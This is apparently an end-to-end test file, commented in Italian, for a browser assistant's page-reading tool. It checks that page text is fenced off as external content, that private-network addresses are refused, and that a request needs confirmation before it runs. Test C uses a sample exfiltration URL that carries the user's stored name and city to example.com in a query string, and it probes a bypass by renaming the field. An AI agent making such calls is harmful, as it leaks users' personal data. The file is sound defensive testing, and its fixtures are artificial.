// LEGGI_PAGINA: la chat apre una pagina web e ne legge il contenuto.
//
// Il buco che chiudeva (#553): la ricerca web dava titolo, indirizzo e un
// riassunto di 240 caratteri; nessuna azione restituiva il TESTO di una pagina.
// Per un prezzo, un orario o una clausola scritti dentro la pagina, Filo poteva
// solo indovinare o rimandare l'utente a leggere da sé.
//
// Ogni test asserisce il successo dal punto di vista dell'utente, e senza il
// fix sarebbe rosso:
//  (A) il numero che sta SOLO dentro la pagina (assente dagli snippet della
//      ricerca) finisce nella risposta in chat; il diario del lavoro dice
//      «Leggo la pagina: <titolo>»; e il testo arriva al modello IMBUSTATO
//      come contenuto esterno, non come una nota di Filo.
//  (B) un indirizzo della rete privata (il router di casa, un server interno)
//      non si legge: il rifiuto torna al modello con la spiegazione, e la
//      risposta lo dice all'utente invece di inventarsi il contenuto.

import { test, expect } from './fixtures/electron.mjs';

async function newtabPage(app) {
  const deadline = Date.now() + 10_000;
  while (Date.now() < deadline) {
    const win = app.windows().find((w) => w.url().startsWith('filo://newtab'));
    if (win) { await win.waitForLoadState('domcontentloaded'); return win; }
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('newtab non trovata');
}

async function configureModel(app) {
  await app.evaluate(async () => {
    const C = globalThis.SN_CONST;
    await globalThis.SN_STORAGE.updateSettings({
      useDefaultModels: false,
      apiKeys: { openrouter: 'k-test' },
      models: { [C.ACTIONS.FILO_CHAT]: 'deepseek-flash' },
      modelRegistry: globalThis.SN_TEST_MODELS.registry,
    });
  });
}

// Il dato che l'utente sta chiedendo esiste SOLO qui dentro: non nel titolo,
// non nel riassunto che la ricerca restituisce.
const PAGINA = `<!DOCTYPE html>
<html lang="it"><head><title>Canone 2026 — Fibra Casa</title></head><body>
  <header class="site-header"><a href="/">Fibra Casa</a></header>
  <nav><ul><li>Offerte</li><li>Assistenza</li></ul></nav>
  <div class="cookie-banner">Accetta tutti i cookie per continuare.</div>
  <main>
    <h1>Canone 2026</h1>
    <p>Il canone annuo della linea domestica è di 1.487,25 euro, IVA inclusa.</p>
    <p>Il contributo di attivazione è una tantum.</p>
  </main>
  <footer class="site-footer">© 2026 Fibra Casa — tutti i diritti riservati</footer>
</body></html>`;

test('A — cerca, apre la pagina, legge il numero e risponde con quello', async ({ app, shell, openTab, testServer }) => {
  test.setTimeout(90_000);
  const page = await newtabPage(app);
  await expect(page.locator('#input')).toBeVisible();
  await configureModel(app);

  // La pagina è già aperta in una scheda di Filo: è la strada che copre anche
  // i siti che si costruiscono in JavaScript, e quella che il mini server
  // locale può servire senza che Filo vada a leggere la rete privata.
  const url = testServer.html(PAGINA);
  await openTab(url);

  // Il primo argomento di `app.evaluate` è il modulo electron: l'indirizzo è il
  // secondo.
  await app.evaluate(async (_electron, indirizzo) => {
    // La ricerca restituisce quello che restituisce davvero: titolo, indirizzo
    // e un riassunto che NON contiene la cifra.
    const origSearch = globalThis.SN_WEB_SEARCH.search;
    globalThis.SN_WEB_SEARCH.search = async ({ query }) => ({
      ok: true,
      provider: 'finto',
      results: [{
        title: 'Canone 2026 — Fibra Casa',
        url: indirizzo,
        snippet: `Tutto sul canone della linea domestica (${query}): condizioni, attivazione e assistenza. Scopri i dettagli nella pagina.`,
      }],
    });

    const orig = globalThis.SN_PROVIDERS.streamCompleteWithFallback;
    globalThis.__restore = () => {
      globalThis.SN_PROVIDERS.streamCompleteWithFallback = orig;
      globalThis.SN_WEB_SEARCH.search = origSearch;
    };
    globalThis.__calls = [];
    globalThis.SN_PROVIDERS.streamCompleteWithFallback = async ({ attempts, messages, tools, onDelta, onToolCall }) => {
      const n = globalThis.__calls.push({
        messages: JSON.parse(JSON.stringify(messages)),
        tools: (tools || []).map((t) => t.function.name),
      });
      const base = { model: attempts[0].model, provider: attempts[0].provider, usage: {} };
      if (n === 1) {
        try { onToolCall && onToolCall({ id: 'q1', name: 'CERCA_WEB' }); } catch (_) {}
        return {
          ...base, text: '',
          toolCalls: [{ id: 'q1', name: 'CERCA_WEB', arguments: '{"query":"canone annuo fibra casa 2026"}' }],
          reasoningDetails: [], finishReason: 'tool_calls',
        };
      }
      if (n === 2) {
        // Il riassunto non basta: si apre il risultato e lo si legge, con
        // l'indirizzo ESATTO preso dai risultati.
        const risultati = messages[messages.length - 1].content;
        const trovato = (risultati.match(/https?:\/\/\S+/) || [''])[0];
        try { onToolCall && onToolCall({ id: 'p1', name: 'LEGGI_PAGINA' }); } catch (_) {}
        return {
          ...base, text: 'Il riassunto non dice la cifra: apro la pagina.',
          toolCalls: [{ id: 'p1', name: 'LEGGI_PAGINA', arguments: JSON.stringify({ url: trovato }) }],
          reasoningDetails: [], finishReason: 'tool_calls',
        };
      }
      // La cifra si legge SOLO nell'esito della lettura: se non fosse arrivata
      // qui, la risposta non potrebbe contenerla.
      const esito = messages[messages.length - 1].content;
      const cifra = (esito.match(/\d[\d.]*,\d{2}/) || ['(non trovata)'])[0];
      const finale = `Il canone annuo è ${cifra} euro, IVA inclusa.`;
      try { onDelta && onDelta(finale); } catch (_) {}
      return { ...base, text: finale, toolCalls: [], reasoningDetails: [], finishReason: 'stop' };
    };
  }, url);

  await page.locator('#input').fill('quanto costa il canone annuo di fibra casa?');
  await page.locator('#sendBtn').click();

  // Il numero che stava SOLO dentro la pagina è arrivato all'utente.
  await expect(page.locator('.dash-bubble-filo', { hasText: '1.487,25' })).toBeVisible({ timeout: 20_000 });

  // Il diario del lavoro dice dove Filo è andato a leggere.
  const activity = page.locator('.dash-activity');
  await expect(activity).toHaveAttribute('data-phase', 'done', { timeout: 10_000 });
  await activity.locator('.dash-activity-head').click();
  const body = activity.locator('.dash-activity-body');
  await expect(body.locator('.dash-activity-row', { hasText: 'Cerco sul web' })).toHaveCount(1);
  // Il sito davanti al titolo: il titolo lo scrive chi possiede la pagina, e da
  // solo non dice dove Filo sia andato a leggere.
  await expect(body.locator('.dash-activity-row', { hasText: /Leggo la pagina: 127\.0\.0\.1.*Canone 2026/ })).toHaveCount(1);
  await expect(activity.locator('.dash-activity-label')).toContainText('letto una pagina');

  const calls = await app.evaluate(() => globalThis.__calls);
  expect(calls.length).toBe(3);
  expect(calls[0].tools).toContain('LEGGI_PAGINA');

  // Lo strumento è stato chiamato e l'esito è tornato come messaggio `tool`.
  const m = calls[2].messages;
  const esito = m[m.length - 1];
  expect(esito.role).toBe('tool');
  expect(esito.tool_call_id).toBe('p1');
  expect(esito.content).toContain('1.487,25');

  // #593 — il testo di una pagina lo scrive chi possiede il sito: arriva
  // IMBUSTATO come contenuto esterno, non nudo dentro una riga di Filo.
  expect(esito.content).toContain('<<<PAGINA_WEB>>>');
  expect(esito.content).toContain('<<<FINE_PAGINA_WEB>>>');

  // Il contenuto, non la cornice del sito.
  expect(esito.content).not.toContain('Accetta tutti i cookie');
  expect(esito.content).not.toContain('Assistenza');

  await app.evaluate(() => { try { globalThis.__restore?.(); } catch (_) {} });
});

test('B — un indirizzo della rete privata non si legge, e il modello lo sa', async ({ app }) => {
  test.setTimeout(60_000);
  const page = await newtabPage(app);
  await expect(page.locator('#input')).toBeVisible();
  await configureModel(app);

  await app.evaluate(async () => {
    const orig = globalThis.SN_PROVIDERS.streamCompleteWithFallback;
    globalThis.__restore2 = () => { globalThis.SN_PROVIDERS.streamCompleteWithFallback = orig; };
    globalThis.__calls2 = [];
    globalThis.SN_PROVIDERS.streamCompleteWithFallback = async ({ attempts, messages, onDelta, onToolCall }) => {
      const n = globalThis.__calls2.push({ messages: JSON.parse(JSON.stringify(messages)) });
      const base = { model: attempts[0].model, provider: attempts[0].provider, usage: {} };
      if (n === 1) {
        try { onToolCall && onToolCall({ id: 'r1', name: 'LEGGI_PAGINA' }); } catch (_) {}
        return {
          ...base, text: '',
          toolCalls: [{ id: 'r1', name: 'LEGGI_PAGINA', arguments: '{"url":"http://192.168.1.1/status"}' }],
          reasoningDetails: [], finishReason: 'tool_calls',
        };
      }
      const esito = messages[messages.length - 1].content;
      const finale = esito.includes('non letta')
        ? 'Non posso leggere quell’indirizzo: non è un sito pubblico.'
        : 'Letta.';
      try { onDelta && onDelta(finale); } catch (_) {}
      return { ...base, text: finale, toolCalls: [], reasoningDetails: [], finishReason: 'stop' };
    };
  });

  await page.locator('#input').fill('leggi http://192.168.1.1/status');
  await page.locator('#sendBtn').click();

  await expect(page.locator('.dash-bubble-filo', { hasText: 'non è un sito pubblico' })).toBeVisible({ timeout: 20_000 });

  const calls = await app.evaluate(() => globalThis.__calls2);
  const esito = calls[1].messages[calls[1].messages.length - 1];
  expect(esito.role).toBe('tool');
  expect(esito.content).toMatch(/non letta/);
  expect(esito.content).toMatch(/rete locale|sito pubblico/);
  // Nessuna busta: non c'è nessun testo esterno da recintare, e una busta
  // vuota insegnerebbe al modello che la lettura è avvenuta.
  expect(esito.content).not.toContain('<<<PAGINA_WEB>>>');

  await app.evaluate(() => { try { globalThis.__restore2?.(); } catch (_) {} });
});

test('C — un indirizzo che porta fuori i dati non si legge senza conferma, comunque si chiami il campo', async ({ app }) => {
  test.setTimeout(60_000);
  await newtabPage(app);
  const esfiltra = 'https://example.com/collect?d=Mario_Rossi_Bologna';

  await app.evaluate(async () => {
    await globalThis.SN_FILO_MEMORY.setMemory({
      PROFILO: 'Si chiama Mario Rossi, vive a Bologna.',
      PREFERENZE: 'Tema scuro.',
    });
    // Nessuna richiesta esce: se la difesa cade, l'elenco lo registra.
    const orig = globalThis.fetch;
    globalThis.__restore3 = () => { globalThis.fetch = orig; };
    globalThis.__contattati = [];
    globalThis.fetch = async (u) => {
      globalThis.__contattati.push(String(u));
      return new Response('<html><body><main><p>ok</p></main></body></html>', {
        status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
      });
    };
  });

  // Filo accetta l'indirizzo sotto più nomi di campo: la conferma deve valere
  // per tutti, altrimenti basta cambiare nome per saltarla.
  for (const campo of ['url', 'indirizzo', 'pagina']) {
    const r = await app.evaluate((_e, { campo: c, u }) =>
      globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', [c]: u }), { campo, u: esfiltra });
    expect(r.executed, campo).toBe(false);
    expect(r.needsConfirm, campo).toBe(2);
    expect(String(r.describe || ''), campo).toContain(esfiltra);
  }

  expect(await app.evaluate(() => globalThis.__contattati)).toEqual([]);
  await app.evaluate(() => { try { globalThis.__restore3?.(); } catch (_) {} });
});

test('D — una scheda che non risponde non tiene appeso il turno: si scarica', async ({ app, openTab, testServer }) => {
  test.setTimeout(90_000);
  const url = testServer.html(PAGINA);
  await openTab(url);

  const out = await app.evaluate(async (electron, u) => {
    // Il JavaScript della pagina è inchiodato: la richiesta del main non torna
    // mai. Senza tempo massimo il turno della chat restava appeso in silenzio.
    const viste = [];
    for (const win of electron.BrowserWindow.getAllWindows()) {
      for (const t of (win._filoTabs?.tabs || [])) {
        if (!t.view?.webContents || t.isInternal) continue;
        const wc = t.view.webContents;
        viste.push([wc, wc.executeJavaScript]);
        wc.executeJavaScript = () => new Promise(() => {});
      }
    }
    const orig = globalThis.fetch;
    globalThis.fetch = async () => new Response(
      '<html><body><main><p>Arrivato dalla rete: 77,70 euro.</p></main></body></html>',
      { status: 200, headers: { 'content-type': 'text/html; charset=utf-8' } },
    );
    const t0 = Date.now();
    try {
      const r = await globalThis.SN_EXECUTE_FILO_ACTION({ type: 'LEGGI_PAGINA', url: u });
      return { ms: Date.now() - t0, output: r.output };
    } finally {
      globalThis.fetch = orig;
      for (const [wc, f] of viste) wc.executeJavaScript = f;
    }
  }, url);

  // Senza tempo massimo questa chiamata non tornerebbe mai. Torna, dopo
  // l'attesa dichiarata, e con un esito: qui la pagina sta sul mini server
  // locale, quindi lo scaricamento la rifiuta come indirizzo privato e il
  // motivo arriva al modello invece del silenzio.
  expect(out.ms).toBeGreaterThan(4000);
  expect(out.ms).toBeLessThan(20_000);
  expect(out.output).toBeTruthy();
  expect(String(out.output.detail || out.output.error)).not.toBe('');
});
